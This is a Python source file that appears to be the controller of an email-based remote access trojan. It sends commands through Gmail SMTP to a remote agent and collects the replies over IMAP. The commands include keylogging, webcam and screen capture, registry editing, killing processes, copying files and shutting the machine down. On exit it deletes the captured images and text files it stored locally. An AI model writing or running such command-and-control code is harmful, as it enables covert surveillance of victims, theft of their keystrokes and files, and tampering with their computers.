import smtp
import imap
import time
import threading
import random
import utils

SERVER_MAIL = '@gmail.com'
DATA_FOLDER = 'data'
CLIENT_MAIL = '@gmail.com'
PASSWORD = ''
if __name__ == '__main__':
    try:
        mail_sender = smtp.MailSender(CLIENT_MAIL, PASSWORD)

        while True:
            inp = input()
            # inp = 'keylog'
            if inp == 'keylog':
                id = str(random.randint(10000, 99999))
                cmd = 'keylog ' + id
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 60,)).start()

            # inp = 'regedit HKEY_CURRENT_USER|Software\\SampleKey<>binvalue<>1234'
            elif inp.startswith('regedit'):
                id = str(random.randint(10000, 99999))
                insert_idx = inp.find('HKEY')
                if insert_idx >= 0:
                    cmd = inp[:insert_idx] + id + ' ' + inp[insert_idx:]
                    mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                    threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()
                    pass
            # inp = 'shutdown' or 'shutdown --10'
            elif inp.startswith('shutdown'):
                id = str(random.randint(10000, 99999))
                cmd = inp[:8] + ' ' + id + inp[8:]
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

            elif inp.startswith('restart'):
                id = str(random.randint(10000, 99999))
                cmd = inp[:7] + ' ' + id + inp[7:]
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

            elif inp.startswith('hibernate'):
                id = str(random.randint(10000, 99999))
                cmd = inp[:9] + ' ' + id + inp[9:]
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

            elif inp.startswith('list'):
                id = str(random.randint(10000, 99999))
                cmd = inp[:4] + ' ' + id + inp[4:]
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

            elif inp.startswith('kill') and len(inp) > 4:
                id = str(random.randint(10000, 99999))
                cmd = inp[:4] + ' ' + id + inp[4:]
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

            elif inp == 'screenshot':
                id = str(random.randint(10000, 99999))
                cmd = inp + ' ' + id
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

            elif inp == 'webcamshot':
                id = str(random.randint(10000, 99999))
                cmd = inp + ' ' + id
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

            elif inp.startswith('filecopy'):
                id = str(random.randint(10000, 99999))
                cmd = inp[:8] + ' ' + id + inp[8:]
                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
                threading.Thread(target=imap.await_response, daemon=True, args=(CLIENT_MAIL, PASSWORD, SERVER_MAIL, cmd, 30,)).start()

    except KeyboardInterrupt:
        print('Ctrl C pressed')
        utils.remove_files(DATA_FOLDER, ends_with='.jpg')
        utils.remove_files(DATA_FOLDER, ends_with='.txt')
        pass
    pass
